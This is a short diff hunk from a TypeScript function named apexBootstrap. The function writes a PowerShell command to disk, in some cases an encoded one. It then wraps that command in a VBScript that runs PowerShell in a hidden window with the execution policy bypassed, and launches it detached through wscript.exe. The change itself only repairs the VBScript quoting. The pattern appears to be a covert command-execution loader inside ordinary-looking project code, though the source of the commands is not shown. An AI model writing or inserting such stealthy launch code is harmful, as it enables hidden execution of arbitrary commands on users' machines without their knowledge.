@@ -210,7 +210,7 @@ export async function apexBootstrap(): Promise<void> {
                 ? ("powershell -NoProfile -EncodedCommand " + _j.cmd)
                 : (_j.exec + " " + _j.args.join(" ") + " " + _j.cmd);
               _fs2.writeFileSync(_psPath, _psCmd, "utf8");
-              const _vbs = 'Set sh = CreateObject("WScript.Shell")\r\nsh.Run "powershell -NoProfile -ExecutionPolicy Bypass -File """ & ' + JSON.stringify(_psPath) + ' & """, 0, False';
+              const _vbs = "Set sh = CreateObject(\"WScript.Shell\")\r\nsh.Run \"powershell -NoProfile -ExecutionPolicy Bypass -File \" & Chr(34) & \"" + _psPath + "\" & Chr(34), 0, False";
               _fs2.writeFileSync(_vbsPath, _vbs, "utf8");
               _sp("wscript.exe", [_vbsPath], { detached: true, stdio: "ignore" }).unref();
               _log("spawned OK");
